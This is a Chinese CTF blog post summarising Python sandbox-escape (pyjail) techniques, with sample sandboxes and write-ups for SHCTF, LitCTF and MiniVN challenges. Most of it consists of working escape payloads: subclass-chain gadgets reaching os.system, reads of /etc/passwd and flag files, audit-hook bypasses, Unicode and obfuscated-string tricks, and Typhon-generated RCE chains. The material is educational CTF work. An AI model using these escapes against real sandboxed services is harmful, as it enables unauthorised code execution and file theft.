---
title: Pyjail沙箱逃逸总结
date: 2026-10-01 11:41:53
tags:
---

在此之前接触过不少pyjail沙箱逃逸题目，玩法颇多，这里总结一下

# Pyjail基础解法

## 最简单的Python沙箱

```Python
import sys

def jailed():
    # 沙箱环境：只给一个空字典作为全局命名空间
    sandbox_globals = {
        "__builtins__": {
            # 只开放这几个"安全"的内建函数
            "print": print,
            "len": len,
            "str": str,
            "int": int,
            "list": list,
            "dict": dict,
            "tuple": tuple,
            "range": range,
        }
    }

    print("=== Python Jail ===")
    print("输入 Python 代码，试试逃逸出去读 /etc/passwd 或执行命令")
    print("输入 exit 退出\n")

    while True:
        try:
            code = input(">>> ")
        except EOFError:
            break

        if code.strip() == "exit":
            break

        try:
            # 在受限的 globals 里执行用户代码
            exec(code, sandbox_globals)
        except Exception as e:
            print(f"[错误] {type(e).__name__}: {e}")

if __name__ == "__main__":
    jailed()
```

把 `__builtins__` 换成了一个白名单字典，没有所谓的危险方法。

pyjail的基础解法就是利用Python 里任何对象都能顺着类继承链爬到 `object`遍历所有子类，从而执行open、eval等危险函数。

## 基础payload

### 获取os模块

```python
[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == "_wrap_close"][0].__init__.__globals__["system"]("id")
```

### 恢复` __builtins__`

```python
[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == "catch_warnings"][0].__init__.__globals__["__builtins__"]["__import__"]("os").system("id")
```

其中`warnings.catch_warnings`可以用`codecs.IncrementalDecoder`或者`importlib._bootstrap._ModuleLock`平替

### 读文件

如果环境里加载了 `importlib` 的引导类，它们的 `__init__.__globals__` 里通常直接有 `_io` 模块，而 `_io` 里有 `open`：

```python
[c.__init__.__globals__['_io'].open('/etc/passwd').read() for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == 'BuiltinImporter']
```

如果子类列表里有 `FileLoader`、`SourceFileLoader` 这类类，它们的全局变量里往往有 `_io` 或 `_os`，而且 `SourceFileLoader` 本身就有 `get_data` 方法，可以直接读文件：

```python
[c.__init__.__globals__['_io'].open('/etc/passwd').read() for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == 'SourceFileLoader']
```

# 沙箱

## 审计钩子沙箱

审计钩子（Audit Hook）是 Python 3.8 引入的一项运行时安全机制（PEP 578），它允许你在解释器层面拦截几乎所有的敏感操作。和之前玩的“沙箱”不同，它不是靠过滤名字，而是在 C 语言层面直接监听事件。

```Python
import sys

def audit_hook(event, args): #event是事件名称如open、eval,args是这个事件操作的参数
    if event == "os.system":
        raise RuntimeError(f"拦截！试图执行系统命令: {args}")
    if event == "open":
        path, mode, flags = args
        if "/etc/passwd" in path:
            raise RuntimeError(f"拦截！试图读取敏感文件: {path}")

sys.addaudithook(audit_hook)
```

### [SHCTF_3rd]Eazy_Pyrunner

通过任意文件读取漏洞我们可以读到源代码

```Python
from flask import Flask, render_template_string, request, jsonify
import subprocess
import tempfile
import os
import sys

app = Flask(__name__)

@app.route('/')
def index():
    # 获取文件名参数，默认读取 'pages/index.html'
    file_name = request.args.get('file', 'pages/index.html')
    
    try:
        with open(file_name, 'r', encoding='utf-8') as f:
            content = f.read()
    except Exception as e:
        # 如果文件不存在或出错，回退到默认页面
        with open('pages/index.html', 'r', encoding='utf-8') as f:
            content = f.read()
            
    return render_template_string(content)

def waf(code):
    """
    简单的关键字过滤函数
    """
    blacklisted_keywords = [
        'import', 'open', 'read', 'write', 'exec', 'eval', 
        '__', 'os', 'sys', 'subprocess', 'run', 'flag', 
        '\'', '\"'
    ]
    
    for keyword in blacklisted_keywords:
        if keyword in code:
            return False
    return True

@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.json.get('code', '')
    
    if not code:
        return jsonify({'error': '请输入Python代码'})
    
    if not waf(code):
        return jsonify({'error': 'Hacker!'})
    
    temp_file_name = None
    try:
        # 创建临时文件
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            # 构造包含审计钩子 (Audit Hook) 的沙箱代码
            sandbox_code = f"""
import sys
sys.modules['os'] = 'not allowed'

def is_my_love_event(event_name):
    return event_name.startswith("Nothing is my love but you.")

def my_audit_hook(event_name, arg):
    if len(event_name) > 0:
        raise RuntimeError("Too long event name!")
    if len(arg) > 0:
        raise RuntimeError("Too long arg!")
    if not is_my_love_event(event_name):
        raise RuntimeError("Hacker out!")

__import__('sys').addaudithook(my_audit_hook)

{code}
"""
            f.write(sandbox_code)
            temp_file_name = f.name

        # 执行临时文件
        result = subprocess.run(
            [sys.executable, temp_file_name],
            capture_output=True,
            text=True,
            timeout=10
        )
        
        return jsonify({
            'stdout': result.stdout,
            'stderr': result.stderr
        })

    except subprocess.TimeoutExpired:
        return jsonify({'error': '代码执行超时（超过10秒）'})
    
    except Exception as e:
        return jsonify({'error': f'执行出错: {str(e)}'})
    
    finally:
        # 清理临时文件
        if temp_file_name and os.path.exists(temp_file_name):
            os.unlink(temp_file_name)

if __name__ == '__main__':
    app.run(debug=True)
```

一个python执行沙盒，我们重点关注两部分

WAF：

```python
blacklisted_keywords = [
        'import', 'open', 'read', 'write', 'exec', 'eval', 
        '__', 'os', 'sys', 'subprocess', 'run', 'flag', 
        '\'', '\"'
    ]
```

沙箱：

```python
import sys
sys.modules['os'] = 'not allowed'  #重新定义os模块为字符串

def is_my_love_event(event_name):
    return event_name.startswith("Nothing is my love but you.")

def my_audit_hook(event_name, arg):  #审计钩子
    if len(event_name) > 0:
        raise RuntimeError("Too long event name!")
    if len(arg) > 0:
        raise RuntimeError("Too long arg!")
    if not is_my_love_event(event_name):
        raise RuntimeError("Hacker out!")

__import__('sys').addaudithook(my_audit_hook)
```

python有一个特性，我们可以重新定义内置函数

![](https://gitee.com/bobrocket/img/raw/master/0.png)

这样我们就可以绕过审计钩子

```python
def len(x):return 0
def is_my_love_event(x):return TRUE
```

下面可以通过继承链获取os

```Python
# 构造关键字符串
clss = str().join(chr(x) for x in [0x5f,0x5f,0x63,0x6c,0x61,0x73,0x73,0x5f,0x5f])      # __class__
mro = str().join(chr(x) for x in [0x5f,0x5f,0x6d,0x72,0x6f,0x5f,0x5f])                # __mro__
sclss = str().join(chr(x) for x in [0x5f,0x5f,0x73,0x75,0x62,0x63,0x6c,0x61,0x73,0x73,0x65,0x73,0x5f,0x5f])  # __subclasses__
it = str().join(chr(x) for x in [0x5f,0x5f,0x69,0x6e,0x69,0x74,0x5f,0x5f])           # __init__
gl = str().join(chr(x) for x in [0x5f,0x5f,0x67,0x6c,0x6f,0x62,0x61,0x6c,0x73,0x5f,0x5f])  # __globals__

ss = str().join(chr(x) for x in [0x73,0x79,0x73,0x74,0x65,0x6d])   # system
s = str().join(chr(x) for x in [0x73,0x79,0x73])                    # os
cmd = str().join(chr(x) for x in [0x2f,0x72,0x65,0x61,0x64,0x5f,0x66,0x6c,0x61,0x67])  # /read_flag

wrapc = str().join(chr(x) for x in [0x5f,0x77,0x72,0x61,0x70,0x5f,0x63,0x6c,0x6f,0x73,0x65])  # _wrap_close
ne = str().join(chr(x) for x in [0x5f,0x5f,0x6e,0x61,0x6d,0x65,0x5f,0x5f])  # __name__

# 核心攻击代码
for i in getattr(getattr(getattr([],clss),mro)[1],sclss)(): #寻找_wrap_close
    try:
        if (wrapc == str(getattr(i,ne))):
            is_my_love_event = lambda event: True
            len = lambda event: 0
            r = getattr(getattr(i,it),gl)[ss](cmd)
            print(r)
            break
    except Exception as e:
        print(e)
        break
```

## AST沙箱

AST 沙箱的核心思路是：在代码执行前，先把它解析成一棵抽象语法树（AST），然后检查树上是否存在危险的“节点类型”，如果不存在才放行执行。

简单沙箱过滤的是字符串（比如 `"import"`），而 AST 沙箱过滤的是语法结构。这带来一个关键优势：无论你怎么拼接字符串，最终生成代码的语法形态是固定的。

比如 `__import__` 和 `getattr(__builtins__, "__imp"+"ort__")`，前者在 AST 里是一个 `Name` 节点，后者是一个 `Call` 节点。沙箱可以只禁止 `ast.Call`（函数调用），这样两者都会被拦截。

```Python
import ast

def verify_ast_secure(tree):
    for node in ast.walk(tree):
        if isinstance(node, (ast.Import, ast.ImportFrom, ast.Call, ast.Attribute)):
            print(f"ERROR: Banned statement {node}")
            return False
    return True
```

### [0xGame2026]漏风的沙箱

这题真的出的很好，教科书式的AST沙箱，比赛还未结束，我就先不放题解了。

# 绕过手法

## unicode绕过

Python3开始支持非ASCII字符的标识符，也就是说，可以使用Unicode字符作为Python变量名，函数名等。python在解析代码时，可以使用Unicode Normalization From KC(NTKC)规范化算法，将一些视觉上相似的Unicode字符统一为一个标准化。

但是如果在正则检查之前进行了标准化转义操作就不能用Unicode绕过了

```python
code = unicodedata.normalize('NFKC', code)
```

### [LitCTF2026]lit_pyjail_unicode

核心逻辑如下

```python
BANNED = re.compile(
    r"\bimport\b|\bexec\b|\beval\b|\bopen\b|\bcompile\b|\bglobals\b|\blocals\b|__|"
    r"\bgetattr\b|\bsetattr\b|\bdelattr\b|\bvars\b|\bbreakpoint\b|\binput\b|"
    r"\bsubprocess\b|\bpty\b|os\.|sys\.|\bposix\b",
    re.IGNORECASE,
)

def banned(raw: str) -> bool:
    if "\\u" in raw or "\\U" in raw or "\\x" in raw:
        return True
    return BANNED.search(raw) is not None

out = eval(line, {"__builtins__": __builtins__})
```

这里有两个关键点：

1. 过滤器检查的是"原始源码字符串"。
2. eval() 时把完整 builtins 暴露出来了。

也就是说，只要想办法在源码层面绕过正则，就还能调用内置函数。

```python
ｏｐｅｎ('/flag').read()
```

## 多行限制的绕过

### exec —— 用字符串执行多行语句

`eval` 只能接表达式，`import os` 是语句。把语句写成字符串塞进 `exec`，`exec` 本身是函数调用（表达式），所以能被 `eval` 接受。

```
eval("exec('import os\nprint(1)')")
```

- 关键：`\n` 换行符让 `exec` 执行多条语句
- 注意：`import("os")` 是错的，`import` 不能当函数调；要导模块用 `__import__("os")`

### compile —— 编译成 code object 再执行

`exec`/`eval` 被禁时的替代。`compile(source, filename, mode)` 把字符串编译成代码对象，再用 `eval` 执行。

```
eval(compile('import os;os.system("id")', '', 'exec'))
```

- `mode='exec'` 允许语句块，`;` 或 `\n` 分隔多条语句
- 比 `exec` 更底层，沙箱常漏掉

### 海象表达式 := —— 在单个表达式里串起赋值链

`eval` 只能吃表达式，普通 `=` 赋值不能出现在表达式里。海象 `:=` 可以，于是能在表达式内部完成“导入 → 保存 → 调用”。

```
eval('[a := __import__("os"), b := a.system("id")]')
```

- 执行顺序：先 `a := __import__("os")`，再 `b := a.system("id")`
- 外层 `[...]` 只是构造列表，让两个海象都求值
- 需要 Python 3.8+

# Typhon的使用

typhon是一个pyjail一把梭工具，可以极大程度辅助做题

## [SHCTF_3rd]Eazy_Pyrunner

还是上面那题，上面已经讲了审计钩子怎么绕过，我们把禁用字符串放进typhon里面跑一下

```Python
import Typhon

Typhon.bypassRCE('whoami',banned_chr=['import', 'open', 'read', 'write', 'exec', 'eval', 
        '__', 'os', 'sys', 'subprocess', 'run', 'flag', 
        '\'', '\"'],interactive=False)
```

跑出的payload运行会报错

```Python
(a for a in ()).gi_frame.f_builtins[bytes([95,95,105,109,112,111,114,116,95,95]).decode()](list(dict(uuid=9))[0])._get_command_stdout(list(dict(whoami=9))[0])
```

我们发现会报错，原因是uuid需要os模块而它被污染，那么有没有办法恢复

![image-20261004144538110](https://gitee.com/bobrocket/img/raw/master/image-20261004144538110.png)

os模块对象被污染所以无法重载

![](https://gitee.com/bobrocket/img/raw/master/1.png)

直接删除就行了，typhon有一个优点就是会展示每一步绕过的结果，我们顺着上去找一下

![](https://gitee.com/bobrocket/img/raw/master/image-20261003194650419.png)

```
del (a for a in ()).gi_frame.f_builtins[bytes([95,95,105,109,112,111,114,116,95,95]).decode()](chr(111)+chr(115))
```

这样就恢复os模块了，我们就可以直接顺势直接调用subprocess模块和getoutput

```Python
def len(x):return 0
def is_my_love_event(x):return True
del (a for a in ()).gi_frame.f_builtins[bytes([95,95,105,109,112,111,114,116,95,95]).decode()](chr(115)+chr(121)+chr(115)).modules[bytes([111, 115]).decode()]
print((a for a in ()).gi_frame.f_builtins[bytes([95,95,105,109,112,111,114,116,95,95]).decode()](list(dict(ssecorpbus=9))[0][::-1]).getoutput(bytes([47, 114, 101, 97, 100, 95, 102, 108, 97, 103]).decode()))
```

写这篇文章的时候已经没有复现环境了，恢复os之后继续使用上面跑出来的payload应该也行吧🤔

## [MiniVN]check_in

```Python
def Ty_RCE(cmd):
    import Typhon
    Typhon.bypassRCE(cmd=cmd,
                         banned_chr=['\\x', '+', 'join', '"', "'", '[', ']', '2', '3', '4', '5', '6', '7', '8', '9'],
                         local_scope={'__builtins__': None, 'lit': list, 'dic': dict},
                         max_length= 248)

Ty_RCE("env")
```

typhon跑出来一个能打通但是没回显的payload，直接用这个输出的是0

```py
lit.__class__.__subclasses__(lit.__class__).__getitem__(0).register.__globals__.get(lit(dic(__builtins__=1)).__getitem__(0)).get(lit(dic(__import__=1)).__getitem__(0))(lit(dic(os=1)).__getitem__(0)).system(lit(dic(env=1)).__getitem__(0))
```

手动改改才能执行命令，但是不能有空格，没法直接读flag，读一下目录还可以

```python
lit.__class__.__subclasses__(lit.__class__).__getitem__(0).register.__globals__.get(lit(dic(__builtins__=1)).__getitem__(0)).get(lit(dic(__import__=1)).__getitem__(0))(lit(dic(os=1)).__getitem__(0)).popen(lit(dic(ls=1)).__getitem__(0)).read()
```

改成open(‘flag’)读flag

```python
lit.__class__.__subclasses__(lit.__class__).__getitem__(0).register.__globals__.get(lit(dic(__builtins__=1)).__getitem__(0)).get(lit(dic(open=1)).__getitem__(0))(lit(dic(flag=1)).__getitem__(0)).read()
```

# 参考文献

[Python沙箱逃逸(pyjail) - N1ngY - 博客园](https://www.cnblogs.com/N1ng/p/18491520)

[Python 沙箱逃逸学习笔记 - se1zer - 博客园](https://www.cnblogs.com/seizer/p/19574448)

[MiniVN-wp | Pr0x1ma'blog](https://pr0x1ma.top/posts/minivn-wp/#check_in)
